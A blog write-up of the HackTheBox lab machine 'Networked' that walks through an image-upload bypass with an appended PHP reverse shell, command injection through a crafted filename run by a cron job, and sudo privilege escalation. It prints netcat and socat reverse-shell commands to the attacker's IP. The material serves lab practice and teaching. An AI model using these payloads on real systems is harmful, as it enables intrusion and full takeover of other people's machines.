---
layout:     post
title:      Networked
summary:    Write-up of HackTheBox's Networked.
categories: writeup
thumbnail: plug
tags:
 - hackthebox
 - writeup
 - walkthrough

---

![](/images/networked/infocard.png)

# Initial Scan

{% highlight plaintext %}
root@kali:~# nmap -sC -sV 10.10.10.146
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-28 18:09 EDT
Nmap scan report for 10.10.10.146
Host is up (0.053s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.23 seconds
{% endhighlight %}

# Web discovery

{% highlight plaintext %}
root@kali:~/HTB/Networked# gobuster dir -u http://10.10.10.146 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x php
===============================================================                                     
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                                     
===============================================================                                     
[+] Url:            http://10.10.10.146
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt          
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================                                     
2019/09/28 18:15:20 Starting gobuster
===============================================================                                     
/index.php (Status: 200)
/uploads (Status: 301)
/photos.php (Status: 200)
/upload.php (Status: 200)
/lib.php (Status: 200)
/backup (Status: 301)
===============================================================                                     
2019/09/28 18:55:42 Finished
===============================================================                                     
{% endhighlight %}

At /upload.php, there's a file uploader. 

![](/images/networked/image1.png)

If we upload a TXT file, it fails:

![](/images/networked/image2.png)

But if we try an image file--like a PNG--it succeeds:

![](/images/networked/image3.png)

If we visit /photos.php, my image is rendered (on the left).

![](/images/networked/image4.png)

So what I'd want to do is upload a PHP reverse shell and visit /photos.php to execute it. But there's clearly some filtering going on in the file upload function.

# Analyzing the PHP files

Luckily, in /backup, all the PHP code is readily available in a TAR file.

![](/images/networked/image5.png)

Just extract it, and you'll see the code behind all the web pages.

![](/images/networked/image6.png)

What's relevant to our exploit are upload.php--which shows the code behind the upload page--and lib.php--which defines the functions used in upload.php.

From upload.php:

{% highlight php %}
    //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
    list ($foo,$ext) = getnameUpload($myFile["name"]);
    $validext = array('.jpg', '.png', '.gif', '.jpeg');
    $valid = false;
    foreach ($validext as $vext) {
      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
      }
    }
{% endhighlight %}

If the file ends in ".jpg", ".png", ".gif", or ".jpeg", it will return True. This is crucial to keep in mind when trying to bypass the file upload.

Another important snippet of upload.php shows why we're triggering that error message:

{% highlight php %}
    if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
      echo '<pre>Invalid image file.</pre>';
      displayform();
    }
{% endhighlight %}

This indicates that if our file doesn't return True for the check_file_type function (or is larger than 60000 bytes), we get the "Invalid image file" error. The check_file_type function is in lib.php:

{% highlight php %}
    function check_file_type($file) {
      $mime_type = file_mime_type($file);
      if (strpos($mime_type, 'image/') === 0) {
          return true;
      } else {
          return false;
      }  
    }
{% endhighlight %}

If the file content type begins with 'image/' (as JPG, PNG, and GIF files do), our file will pass the test. And what does the file_mime_type function do?

{% highlight php %}
    function file_mime_type($file) {
      $regexp = '/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/';
      if (function_exists('finfo_file')) {
        $finfo = finfo_open(FILEINFO_MIME);
        if (is_resource($finfo)) // It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system
        {
          $mime = @finfo_file($finfo, $file['tmp_name']);
          finfo_close($finfo);
          if (is_string($mime) && preg_match($regexp, $mime, $matches)) {
            $file_type = $matches[1];
            return $file_type;
          }
        }
      }
{% endhighlight %}

(Above is only part of the function.) If our file matches on the regex in the second line, it should pass this as well.

I head over to regex101.com, enter in the regex, and manipulate my filename in line with some common upload bypasses. I remember to keep ".png" at the end, so that it passes the first snippet of code I mentioned.

Here's one that appears to work:

![](/images/networked/image7.png)

# Performing the bypass

First, let's test if we can even include PHP code in our test PNG file. Then, we'll manipulate the file name so that we can trigger our payload as a file with the .php extension.

I intercept my normal file upload with Burp. The filename, Content-Type, and content itself look like this.

![](/images/networked/image8.png)

So I create a PHP reverse shell (using the one in webshells) and paste it right after my PNG content ends.

![](/images/networked/image9.png)

I forward the request, and my upload succeeds.

![](/images/networked/image3.png)

This means that the upload does no checks to see if there's any PHP code in the image. (It may check for "magic bytes" in the beginning of the file, which is why I was careful to preserve the PNG and add the PHP _after_the PNG content.)

To execute the code, we need the file to have the .php extension, not .png, so I send the upload again with the PHP code--but I also modify the filename like this:

![](/images/networked/image10.png)

As with before, it succeeds.

![](/images/networked/image3.png)

I set up my netcat listener:

{% highlight plaintext %}
root@kali:~/HTB/Networked# nc -nlvp 443
listening on [any] 443 ...
{% endhighlight %}

Then I visit /photos.php to trigger the payload. We see our filename on the page, but no image.

![](/images/networked/image11.png)

Back on my listener, I get a shell as user Apache.

{% highlight plaintext %}
root@kali:~/HTB/Networked# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.146] 57646
Linux networked.htb 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 02:54:28 up  2:45,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ 
{% endhighlight %}

I upgrade to a Python TTY to make life easier:

{% highlight plaintext %}
sh-4.2$ python -c 'import pty;pty.spawn("/bin/bash")'
{% endhighlight %}

# Analyzing the cronjob

In the user guly's home folder, we find:

* User.txt -- with no permission to read
* check_attack.php -- a script that checks if filenames have been modified and alerts the user guly
* crontab.guly -- a cronjob that executes check_attack.php every 3 minutes. We can assume this is under the context of user guly, given the filename and location.

{% highlight plaintext %}
bash-4.2$ cat crontab.guly
*/3 * * * * php /home/guly/check_attack.php
{% endhighlight %}

Let's see what check_attack.php does (comments mine).

{% highlight php %}
<?php

# Invoking functions from lib.php

require '/var/www/html/lib.php';

# Setting up variables, including fields for an e-mail

$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

# Below will scan all files in /var/www/html/uploads and place them in the $files array.

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }

# Ensuring that all filenames are a valid IP address.
# The check_ip function is found in lib.php.

  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

# If the filename is not an IP address, echo "attack!"
# and place the file contents in the e-mail message.

  if (!($check[0])) {
    echo "attack!\n";
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);                                       

	# Delete the file.

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");                                        
    echo "rm -f $path$value\n";
    
    # Mail the file to guly.
    
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
{% endhighlight %}

Ideally, we'd want the script to give us a shell, but we can't modify the script. What we can modify, however, are filenames in the uploads folder--which are part of this script.

# Command execution for guly

The variable we have control over is `$value`. If we add or rename a file in /var/www/html/uploads, we can insert our own input into the script. But it's tough to know exactly where in the script this would be effective. Luckily, we can get an idea of what's going on with the "echo" commands throughout. And we can test executing the PHP as Apache to see if we're getting the right results--before we let the cronjob (i.e., user guly) execute it.

First, I create a test file (test.txt), drop it in the uploads folder, and run the PHP script.

{% highlight plaintext %}
bash-4.2$ cd /var/www/html/uploads
cd /var/www/html/uploads
bash-4.2$ touch "test.txt"
touch "test.txt"
bash-4.2$ php /home/guly/check_attack.php
php /home/guly/check_attack.php
attack!
rm -f /var/www/html/uploads/test.txt
{% endhighlight %}

So the filename ($value) appends to the end of "rm -f /var/www/html/uploads". In the script, the actual code we're manipulating is:

{% highlight php %}
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");                                        
{% endhighlight %}

If we can add a filename that starts with a semicolon and continues with a command, we could add an entirely new command for php exec() to run.

{% highlight php %}
exec("nohup /bin/rm -f $path; command-to-inject; > /dev/null 2>&1 &");                                        
{% endhighlight %}

# The right reverse shell

I had trouble getting netcat to work here. First because of the slashes...

{% highlight plaintext %}
bash-4.2$ touch "; nc 10.10.14.27 4444 -e '/bin/bash'"
touch: cannot touch '; nc 10.10.14.27 4444 -e \'/bin/bash\'': No such file or directory
{% endhighlight %}

So I looked to other shells, like socat. I set up my listener on Kali:

{% highlight plaintext %}
root@kali:~# socat file:`tty`,raw,echo=0 tcp-listen:4444
{% endhighlight %}

Then I create my filename that somehow allows all these punctuation marks (as long as they aren't slashes).

{% highlight plaintext %}
bash-4.2$ touch "; socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.27:4444" 
{% endhighlight %}

And I execute the attack as user apache:

{% highlight plaintext %}
bash-4.2$ php /home/guly/check_attack.php
attack!
nohup: ignoring input and redirecting stderr to stdout
rm -f /var/www/html/uploads/; socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.27:4444
{% endhighlight %}

And I get a shell as apache on my listener. So the test worked.

{% highlight plaintext %}
root@kali:~# socat file:`tty`,raw,echo=0 tcp-listen:4444
bash-4.2$ whoami
apache
{% endhighlight %}

So now for the real deal. On my attacking machine, I kill the second apache shell and create a new socat listener. On the victim machine, I create that socat payload filename. But instead of executing it, I wait for the cronjob to execute as user guly. Within 3 minutes, I have a shell as guly:

{% highlight plaintext %}
root@kali:~# socat file:`tty`,raw,echo=0 tcp-listen:4444  
[guly@networked ~]$ 
{% endhighlight %}

And here's user.txt.

{% highlight plaintext %}
[guly@networked ~]$ cat user.txt
526c############################
{% endhighlight %}

# Another exploitable script

What I love about this box is that everything revolves around finding flaws through code review. As we find through `sudo -l` (which shows everything guly is allowed to run as root), we have another exploitable script to play with.

{% highlight plaintext %}
[guly@networked /]$ sudo -l
<--- snip --->
User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
{% endhighlight %}

This is changename.sh:

{% highlight bash %}
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
{% endhighlight %}

So this script changes some values in a configuration file regarding the network interface guly0. I decide to check the configuration file:

{% highlight plaintext %}
[guly@networked ~]$ cat /etc/sysconfig/network-scripts/ifcfg-guly
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
NAME=ps /tmp/foo
PROXY_METHOD=asodih
BROWSER_ONLY=asdoih
BOOTPROTO=asdoih
{% endhighlight %}

When I run changename.sh as guly without sudo, it prompts me to change each field (where I enter "test"), but I don't have permission to do so.

{% highlight plaintext %}
[guly@networked ~]$ changename.sh
/usr/local/sbin/changename.sh: line 2: /etc/sysconfig/network-scripts/ifcfg-guly: Permission denied
interface NAME:
test
/usr/local/sbin/changename.sh: line 18: /etc/sysconfig/network-scripts/ifcfg-guly: Permission denied
interface PROXY_METHOD:
test
/usr/local/sbin/changename.sh: line 18: /etc/sysconfig/network-scripts/ifcfg-guly: Permission denied
interface BROWSER_ONLY:
test
/usr/local/sbin/changename.sh: line 18: /etc/sysconfig/network-scripts/ifcfg-guly: Permission denied
interface BOOTPROTO:
test
/usr/local/sbin/changename.sh: line 18: /etc/sysconfig/network-scripts/ifcfg-guly: Permission denied
grep: /etc/sysconfig/network-scripts/ifcfg-ens33: Permission denied
grep: /etc/sysconfig/network-scripts/ifcfg-ens33: Permission denied
/etc/sysconfig/network-scripts/ifcfg-guly: line 4: /tmp/foo: No such file or directory
Users cannot control this device.
{% endhighlight %}

What's strange is that second to last line: "/tmp/foo: No such file or directory". It implies that something at /tmp/foo is trying to be executed, but there's no file there. /tmp is generally a world-writable directory, so I try to add my own "foo" there and rerun the script.

{% highlight plaintext %}
[guly@networked ~]$ echo "echo test" > /tmp/foo                                                     
[guly@networked ~]$ chmod 777 /tmp/foo                                                              
[guly@networked ~]$ changename.sh                                                                   
{% endhighlight %}

And in my output, I see that "test" was echoed.

{% highlight plaintext %}
/usr/local/sbin/changename.sh: line 18: /etc/sysconfig/network-scripts/ifcfg-guly: Permission denied
grep: /etc/sysconfig/network-scripts/ifcfg-ens33: Permission denied                                 
grep: /etc/sysconfig/network-scripts/ifcfg-ens33: Permission denied                                 
test                                                                                                
Users cannot control this device.                                                                   
{% endhighlight %}

So it seems as though, if I store any command as /tmp/foo, the user running changename.sh will execute it. If I try with "cat /root/root.txt--and sudo the changename.sh script this time--root should read the root flag in the output. I'll also have to be careful not to change the "NAME" field (ps /tmp/foo), as root can actually modify the fields, and this will likely mess things up.

{% highlight plaintext %}
[guly@networked ~]$ echo "cat /root/root.txt" > /tmp/foo
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh                                             
interface NAME:
ps /tmp/foo
interface PROXY_METHOD:                                                                             
s                      
interface BROWSER_ONLY:
s                                                                                                   
interface BOOTPROTO:   
s
0a8e############################                                                                    
0a8e############################
ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delay
ing initialization.                                                                                 
{% endhighlight %}

As expected, the flag appears in the output.

# Bonus points: root shell

The technique to read the flag doesn't take much modifying to get root shell. Simply replace /tmp/foo with a netcat command.

{% highlight plaintext %}
[guly@networked ~]$ echo "nc -e /bin/bash 10.10.14.27 3333" > /tmp/foo
[guly@networked ~]$ chmod 777 /tmp/foo
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh                
interface NAME:
ps /tmp/foo
interface PROXY_METHOD:
s
interface BROWSER_ONLY:
s
interface BOOTPROTO:
s
{% endhighlight %}

{% highlight plaintext %}
root@kali:~# nc -nlvp 3333
listening on [any] 3333 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.146] 47768
whoami
root
{% endhighlight %}